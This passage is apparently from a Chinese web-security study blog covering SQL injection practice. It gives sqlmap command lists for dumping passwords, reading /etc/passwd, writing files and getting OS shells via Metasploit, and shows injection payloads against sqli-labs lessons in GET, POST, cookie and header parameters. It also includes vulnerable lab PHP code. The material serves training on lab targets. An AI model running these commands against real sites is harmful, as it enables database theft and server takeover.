--stop 3 -v 2 4./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --dump -C <span class="token string">"user,pass"</span>  -v 1 --exclude-sysdbs 5./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --sql-shell -v 2 6./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --file-read <span class="token string">"c:\boot.ini"</span> -v 2 7./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 8./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --os-cmd <span class="token string">"id"</span> -v 1 9./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --os-shell --union-use -v 2 10./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --os-pwn --msf-path<span class="token operator">=</span>/opt/framework/msf3 --priv-esc -v 1 11./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --os-pwn --msf-path<span class="token operator">=</span>/opt/framework/msf3 -v 1 12./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --os-bof --msf-path<span class="token operator">=</span>/opt/framework/msf3 -v 1 13./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --reg-add --reg-key<span class="token operator">=</span><span class="token string">"HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap"</span> --reg-value<span class="token operator">=</span>Test --reg-type<span class="token operator">=</span>REG_SZ --reg-data<span class="token operator">=</span>1 14./sqlmap.py -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -b --eta 15./sqlmap.py -u <span class="token string">"http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1"</span> -p <span class="token function">id</span> --prefix <span class="token string">"')"</span> --suffix <span class="token string">"AND ('abc'='abc"</span>16./sqlmap.py -u <span class="token string">"http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1"</span> --auth-type Basic --auth-cred <span class="token string">"testuser:testpass"</span>17./sqlmap.py -l burp.log --scope<span class="token operator">=</span><span class="token string">"(www)?\.target\.(com|net|org)"</span>18./sqlmap.py -u <span class="token string">"http://192.168.136.131/sqlmap/mysql/get_int.php?id=1"</span> --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 19./sqlmap.py -u <span class="token string">"http://192.168.136.131/sqlmap/mssql/get_int.php?id=1"</span> --sql-query <span class="token string">"SELECT 'foo'"</span> -v 1 20./sqlmap.py -u <span class="token string">"http://192.168.136.129/mysql/get_int_4.php?id=1"</span> --common-tables -D testdb --banner 21./sqlmap.py -u <span class="token string">"http://192.168.136.129/mysql/get_int_4.php?id=1"</span> --cookie<span class="token operator">=</span><span class="token string">"PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low"</span> --string<span class="token operator">=</span><span class="token string">'xx'</span> --dbs --level<span class="token operator">=</span>3 -p <span class="token string">"uid"</span>简单的注入流程 <span class="token keyword">:</span>1.读取数据库版本，当前用户，当前数据库 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 -f -b --current-user --current-db -v 1 2.判断当前数据库用户权限 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --privileges -U 用户名 -v 1 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --is-dba -U 用户名 -v 1 3.读取所有数据库用户或指定数据库用户的密码 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --users --passwords -v 2 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --passwords -U root -v 2 4.获取所有数据库 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --dbs -v 2 5.获取指定数据库中的所有表 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --tables -D mysql -v 2 6.获取指定数据库名中指定表的字段 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --columns -D mysql -T <span class="token function">users</span> -v 2 7.获取指定数据库名中指定表中指定字段的数据 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --dump -D mysql -T <span class="token function">users</span> -C <span class="token string">"username,password"</span> -s <span class="token string">"sqlnmapdb.log"</span> -v 2 8.file-read读取web文件 sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --file-read <span class="token string">"/etc/passwd"</span> -v 2 9.file-write写入文件到web sqlmap -u http://www.xxxxx.com/test.php?p<span class="token operator">=</span>2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：</code></pre><h3 id="三、简要学习各种注入工具的使用指南"><a href="#三、简要学习各种注入工具的使用指南" class="headerlink" title="三、简要学习各种注入工具的使用指南"></a><font size="5"><strong>三、简要学习各种注入工具的使用指南</strong></font></h3><h4 id="1、jsql工具安装使用"><a href="#1、jsql工具安装使用" class="headerlink" title="1、jsql工具安装使用"></a><font size="4"><strong>1、jsql工具安装使用</strong></font></h4><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/hackbar<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># apt-get -f install jsql</span>正在读取软件包列表<span class="token punctuation">..</span>. 完成正在分析软件包的依赖关系树正在读取状态信息<span class="token punctuation">..</span>. 完成下列【新】软件包将被安装：  jsql升级了 0 个软件包，新安装了 1 个软件包，要卸载 0 个软件包，有 1573 个软件包未被升级。需要下载 2,500 B 的归档。解压缩后会消耗 9,216 B 的额外空间。获取:1 https://mirrors.aliyun.com/kali kali-rolling/main amd64 jsql all 0.82-0kali2 <span class="token punctuation">[</span>2,500 B<span class="token punctuation">]</span>已下载 2,500 B，耗时 2秒 <span class="token punctuation">(</span>1,099 B/s<span class="token punctuation">)</span>正在选中未选择的软件包 jsql。<span class="token punctuation">(</span>正在读取数据库 <span class="token punctuation">..</span>. 系统当前共安装有 307905 个文件和目录。<span class="token punctuation">)</span>准备解压 <span class="token punctuation">..</span>./jsql_0.82-0kali2_all.deb  <span class="token punctuation">..</span>.正在解压 jsql <span class="token punctuation">(</span>0.82-0kali2<span class="token punctuation">)</span> <span class="token punctuation">..</span>.正在设置 jsql <span class="token punctuation">(</span>0.82-0kali2<span class="token punctuation">)</span> <span class="token punctuation">..</span>.</code></pre><p>启动直接数据jsql<br><img src="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/6.png"><br><img src="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/7.png"><br>对一些简单的注入有用对于post注入的效果不好</p><h4 id="2、pangolin工具使用"><a href="#2、pangolin工具使用" class="headerlink" title="2、pangolin工具使用"></a><font size="4"><strong>2、pangolin工具使用</strong></font></h4><p><img src="/2023/09/28/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-015/8.png"></p><p>能够做一些简单的SQL注入、对于post注入效果也不是很好，另外执行的速度也很慢，只能在window平台使用。</p><p>熟悉工具的支持库，注入模式，优缺点等<br>sqlmap, NoSQLAttack , Pangolin等</p><h3 id="四、相关资源"><a href="#四、相关资源" class="headerlink" title="四、相关资源:"></a><font size="5"><strong>四、相关资源:</strong></font></h3><p><a href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a><br><a href="https://github.com/youngyangyang04/NoSQLAttack">https://github.com/youngyangyang04/NoSQLAttack</a><br><a href="https://github.com/sqlmapproject/sqlmap/zipball/master">https://github.com/sqlmapproject/sqlmap/zipball/master</a><br>https:&#x2F;blog.csdn.net&#x2F;qq_39936434&#x2F;category_9103379.html<br><a href="https://www.mozhe.cn/bug/WUJ30GVQSTlyeXdvbHU2ZmVOMjVDU7bW96aGUmozhe">https://www.mozhe.cn/bug/WUJ30GVQSTlyeXdvbHU2ZmVOMjVDU7bW96aGUmozhe</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-014</title>
      <link href="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/"/>
      <url>/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-类型及提交注入"><a href="#WEB漏洞-类型及提交注入" class="headerlink" title="WEB漏洞-类型及提交注入"></a><font size="6"><strong>WEB漏洞-类型及提交注入</strong></font></h2><span id="more"></span><p><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/1.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#简要明确参数类型</span>数字，字符，搜索，JsoN等<span class="token comment" spellcheck="true">#简要明确请求方法</span>GET, POST,COOKIE，REQUEST，HTTP头等其中sql语句干扰符号: ',",s,<span class="token punctuation">)</span>,<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;等，具体需看写法</span></code></pre><h3 id="一、参数字符型注入测试"><a href="#一、参数字符型注入测试" class="headerlink" title="一、参数字符型注入测试"></a><font size="5"><strong>一、参数字符型注入测试</strong></font></h3><h4 id="sqlilabs-less-5-6"><a href="#sqlilabs-less-5-6" class="headerlink" title="&#x3D;&gt;sqlilabs less 5 6"></a><font size="4"><strong>&#x3D;&gt;sqlilabs less 5 6</strong></font></h4><p>在靶场中查看源代码</p><pre class=" language-bash"><code class="language-bash">root@9a845c5ed654:/var/www/html/Less-5<span class="token comment" spellcheck="true"># cat index.php</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html PUBLIC <span class="token string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="token string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span><span class="token operator">></span><span class="token operator">&lt;</span>html xmlns<span class="token operator">=</span><span class="token string">"http://www.w3.org/1999/xhtml"</span><span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span><span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"Content-Type"</span> content<span class="token operator">=</span><span class="token string">"text/html; charset=utf-8"</span> /<span class="token operator">></span><span class="token operator">&lt;</span>title<span class="token operator">></span>Less-5 Double Query- Single Quotes- String<span class="token operator">&lt;</span>/title<span class="token operator">></span><span class="token operator">&lt;</span>/head<span class="token operator">></span><span class="token operator">&lt;</span>body bgcolor<span class="token operator">=</span><span class="token string">"#000000"</span><span class="token operator">></span><span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">" margin-top:60px;color:#FFF; font-size:23px; text-align:center"</span><span class="token operator">></span>Welcome<span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token operator">&lt;</span>font color<span class="token operator">=</span><span class="token string">"#FF0000"</span><span class="token operator">></span> Dhakkan <span class="token operator">&lt;</span>/font<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>font size<span class="token operator">=</span><span class="token string">"3"</span> color<span class="token operator">=</span><span class="token string">"#FFFF00"</span><span class="token operator">></span><span class="token operator">&lt;</span>?php//including the Mysql connect parameters.include<span class="token punctuation">(</span><span class="token string">"../sql-connections/sql-connect.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>error_reporting<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>// take the variablesif<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>//logging the connection parameters to a <span class="token function">file</span> <span class="token keyword">for</span> analysis.<span class="token variable">$fp</span><span class="token operator">=</span>fopen<span class="token punctuation">(</span><span class="token string">'result.txt'</span>,<span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fwrite<span class="token punctuation">(</span><span class="token variable">$fp</span>,<span class="token string">'ID:'</span><span class="token keyword">.</span><span class="token variable">$id</span><span class="token keyword">.</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fclose<span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>// connectivity<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#SQL执行的语句</span><span class="token variable">$result</span><span class="token operator">=</span>mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> mysql_fetch_array<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        if<span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'You are in...........'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/font>"</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token keyword">else</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;font size="3" color="#FFFF00">'</span><span class="token punctuation">;</span>        print_r<span class="token punctuation">(</span>mysql_error<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;/br>&lt;/font>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#0000ff" font size= 3>'</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token keyword">else</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; echo "Please input the ID as parameter with numeric value";&amp;#125;</span>?<span class="token operator">></span><span class="token operator">&lt;</span>/font<span class="token operator">></span> <span class="token operator">&lt;</span>/div<span class="token operator">></span><span class="token operator">&lt;</span>/br<span class="token operator">></span><span class="token operator">&lt;</span>/br<span class="token operator">></span><span class="token operator">&lt;</span>/br<span class="token operator">></span><span class="token operator">&lt;</span>center<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"../images/Less-5.jpg"</span> /<span class="token operator">></span><span class="token operator">&lt;</span>/center<span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre><p>$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1”;SQL执行的语句是采用了’’闭合,<br>我们要是直接使用?id&#x3D;1 and 1&#x3D;1相当于执行的是SELECT * FROM users WHERE id&#x3D;’1 and 1&#x3D;1’ LIMIT 0,1;是不会有任何的反应。<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/2.png"><br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/3.png"></p><p>正确的报错语句</p><pre class=" language-bash"><code class="language-bash">http://10.1.1.133/Less-5/?id<span class="token operator">=</span>1<span class="token string">' and '</span>1<span class="token string">'='</span>1http://10.1.1.133/Less-5/?id<span class="token operator">=</span>1<span class="token string">' and '</span>1<span class="token string">'='</span>2</code></pre><p><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/4.png"><br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/5.png"><br>在浏览器中解释执行的%27是’</p><p>在数据库中执行语句为</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span><span class="token string">'1'</span> and <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span> LIMIT 0,1<span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb     <span class="token operator">|</span>+----+----------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span><span class="token string">'1'</span> and <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'2'</span> LIMIT 0,1<span class="token punctuation">;</span>Empty <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><p>获取字段<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/6.png"></p><h4 id="–-是将后面的代码注释不执行"><a href="#–-是将后面的代码注释不执行" class="headerlink" title="–+是将后面的代码注释不执行"></a><font size="4"><strong>–+是将后面的代码注释不执行</strong></font></h4><p>在数据库中执行</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span><span class="token string">'1'</span> order by 4<span class="token punctuation">;</span>ERROR 1054 <span class="token punctuation">(</span>42S22<span class="token punctuation">)</span>: Unknown column <span class="token string">'4'</span> <span class="token keyword">in</span> <span class="token string">'order clause'</span>mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> WHERE id<span class="token operator">=</span><span class="token string">'1'</span> order by 3<span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span>  1 <span class="token operator">|</span> Dumb     <span class="token operator">|</span> Dumb     <span class="token operator">|</span>+----+----------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><p><strong>Less-6代码查看</strong></p><pre class=" language-bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'"'</span><span class="token keyword">.</span><span class="token variable">$id</span><span class="token keyword">.</span><span class="token string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span></code></pre><p>采用双引号的方式进行了编码，绕过方法”闭合前面的引号后面采用–+注释<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/7.png"></p><h3 id="二、POST数据提交注入测试"><a href="#二、POST数据提交注入测试" class="headerlink" title="二、POST数据提交注入测试"></a><font size="5"><strong>二、POST数据提交注入测试</strong></font></h3><h4 id="sqlilabs-less-11"><a href="#sqlilabs-less-11" class="headerlink" title="&#x3D;&gt;sqlilabs less 11"></a><font size="4"><strong>&#x3D;&gt;sqlilabs less 11</strong></font></h4><p><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/8.png"></p><p>用户和密码都正确提交<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/9.png"></p><p>在代码中查看代码的书写</p><pre class=" language-bash"><code class="language-bash">57          @<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username='<span class="token variable">$uname</span>' and password='<span class="token variable">$passwd</span>' LIMIT 0,1"</span><span class="token punctuation">;</span>58          <span class="token variable">$result</span><span class="token operator">=</span>mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>59          <span class="token variable">$row</span> <span class="token operator">=</span> mysql_fetch_array<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>为了实验方便将下面回显sql执行命令57          @<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username='<span class="token variable">$uname</span>' and password='<span class="token variable">$passwd</span>' LIMIT 0,1"</span><span class="token punctuation">;</span>58<span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>59          <span class="token variable">$result</span><span class="token operator">=</span>mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>60          <span class="token variable">$row</span> <span class="token operator">=</span> mysql_fetch_array<span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/10.png"></p><h4 id="用hackbar模拟post数据提交测试"><a href="#用hackbar模拟post数据提交测试" class="headerlink" title="用hackbar模拟post数据提交测试"></a><font size="4" ><strong>用hackbar模拟post数据提交测试</strong></font></h4><p>以下操作使用hackbar进行渗透测试，hackbar安装地址：<a href="https://github.com/HCTYMFF/hackbar2.1.3">https://github.com/HCTYMFF/hackbar2.1.3</a></p><p><font  color=" red"><strong>一般的登录情况都是采用的post提交数据、通过抓包获取到登录信息将它放在hackbar中进行登录测试，也是为了验证hackbar是否能正常使用，要是确认hackbar能正常使用这个可以跳过。</strong></font><br>在burp抓包获取登录信息<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/11.png"><br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/12.png"><br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/13.png"></p><p>枚举数据库字段<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/14.png"></p><pre class=" language-bash"><code class="language-bash">uname<span class="token operator">=</span>admin' order by 3<span class="token comment" spellcheck="true">#&amp;passwd=admin&amp;submit=Submit</span></code></pre><p><strong>备注：</strong>在mysql中一般注释后面的字句是采用的–+在有些的字句中采用#注释。需要多测试才能发现，为了验证#是注释符号将#替换为–+执行查看结果看到报错信息。<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/15.png"><br><strong>在数据库中执行，最终验证#是注释了后面的字句。</strong></p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> username,password from <span class="token function">users</span> where username<span class="token operator">=</span><span class="token string">'admin'</span> and 1<span class="token operator">=</span>2 union <span class="token keyword">select</span> 1,2 --+ and password<span class="token operator">=</span><span class="token string">'admin'</span> limit 0 1    -<span class="token operator">></span> <span class="token punctuation">;</span>ERROR 1064 <span class="token punctuation">(</span>42000<span class="token punctuation">)</span>: You have an error <span class="token keyword">in</span> your SQL syntax<span class="token punctuation">;</span> check the manual that corresponds to your MySQL server version <span class="token keyword">for</span> the right syntax to use near <span class="token string">'and password='</span>admin<span class="token string">' limit 0 1'</span> at line 1mysql<span class="token operator">></span>将--+替换为<span class="token comment" spellcheck="true">#</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> username,password from <span class="token function">users</span> where username<span class="token operator">=</span><span class="token string">'admin'</span> and 1<span class="token operator">=</span>2 union <span class="token keyword">select</span> 1,2 <span class="token comment" spellcheck="true"># and password='admin' limit 0 1</span>    -<span class="token operator">></span> <span class="token punctuation">;</span>+----------+----------+<span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----------+----------+<span class="token operator">|</span> 1        <span class="token operator">|</span> 2        <span class="token operator">|</span>+----------+----------+1 row <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span>mysql<span class="token operator">></span></code></pre><p>将order by 3改为2查看<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/16.png"></p><pre class=" language-bash"><code class="language-bash">uname<span class="token operator">=</span>admin' order by 2<span class="token comment" spellcheck="true">#&amp;passwd=admin&amp;submit=Submit</span></code></pre><p>这里看到我们登陆成功，但实际上我们登陆的用户名和密码是错误的因为只是将sql语句注入进去没有报错下面的语句正常的执行就显示登陆成功，换句话说登录到情况只有两个字段。很可能就是用户名和密码。</p><p>枚举出数据库名称:</p><pre class=" language-bash"><code class="language-bash">uname<span class="token operator">=</span>admin' and 1<span class="token operator">=</span>2 union <span class="token keyword">select</span> database<span class="token punctuation">(</span><span class="token punctuation">)</span>,2 <span class="token comment" spellcheck="true">#&amp;passwd=admin&amp;submit=Submit</span></code></pre><p><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/17.png"><br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/18.png"></p><h3 id="三、参数JSON数据注入测试"><a href="#三、参数JSON数据注入测试" class="headerlink" title="三、参数JSON数据注入测试"></a><font size="5"><strong>三、参数JSON数据注入测试</strong></font></h3><p><font size="4" ><strong>&#x3D;&gt;本地环境代码演示</strong></font><br>json格式<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/19.png"></p><p>json注入<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/20.png"><br>注入方式：如果是数字的可以不加’闭合如果是字符的话，加上”闭合</p><h3 id="四、COOKIE数据提交注入测试"><a href="#四、COOKIE数据提交注入测试" class="headerlink" title="四、COOKIE数据提交注入测试"></a><font size="5"><strong>四、COOKIE数据提交注入测试</strong></font></h3><p>&#x3D;&gt;sqlilabs less 20<br><font size="4" ><strong>网站传递参数的方式</strong></font></p><table>    <thead>        <tr>            <th>参数类型</th>            <th>含义</th>        </tr>    </thead>    <tbody>        <tr>            <td>get型</td>            <td>一般访问网页的行为</td>        </tr>        <tr>            <td>cookie型</td>            <td>伴随着所有访问网页的行为</td>        </tr>        <tr>            <td>post型</td>            <td>上传文件，登陆</td>        </tr>    </tbody></table><p>cookie注入原理：对get传递来的参数进行了过滤，但是忽略了cookie也可以传递参数。<br>【cookie注入的原理在于更改本地的cookie，从而利用cookie来提交非法语句。】 </p><p>通过burp抓包分析<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/21.png"><br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/22.png"><br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/23.png"></p><p>将这个数据包发送到repeater模块当中<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/24.png"></p><p>修改cookie参数Cookie: uname&#x3D;admin’ and 1&#x3D;2 union select database(),2,3 #<br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/25.png"><br><img src="/2023/09/27/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-014/26.png"></p><h3 id="五、HTTP头部参数数据注入测试"><a href="#五、HTTP头部参数数据注入测试" class="headerlink" title="五、HTTP头部参数数据注入测试"></a><font size="5"><strong>五、HTTP头部参数数据注入测试</strong></font></h3><p>&#x3D;&gt;sqlilabs less 18</p><p>查看数据库源代码</p><pre class=" language-bash"><code class="language-bash">       <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token variable">$uname</span> and users.password=<span class="token variable">$passwd</span> ORDER BY users.id DESC LIMIT 0,                                   1"</span><span class="token punctuation">;</span>        <span class="token variable">$result1</span> <span class="token operator">=</span> mysql_query<span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$row1</span> <span class="token operator">=</span> mysql_fetch_array<span class="token punctuation">(</span><span class="token variable">$result1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                if<span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">)</span>                        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 3 >'</span><span class="token punctuation">;</span>                        <span class="token variable">$insert</span><span class="token operator">=</span><span class="token string">"INSERT INTO <span class="token variable"><span class="token variable">`</span>security<span class="token variable">`</span></span>.<span class="token variable"><span class="token variable">`</span>uagents<span class="token variable">`</span></span> (<span class="token variable"><span class="token variable">`</span>uagent<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>ip_address<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>username<span class="token variable">`</span></span>) VALUES ('<span class="token variable">$uagent</span>', '<span class="token variable">$IP</span>', 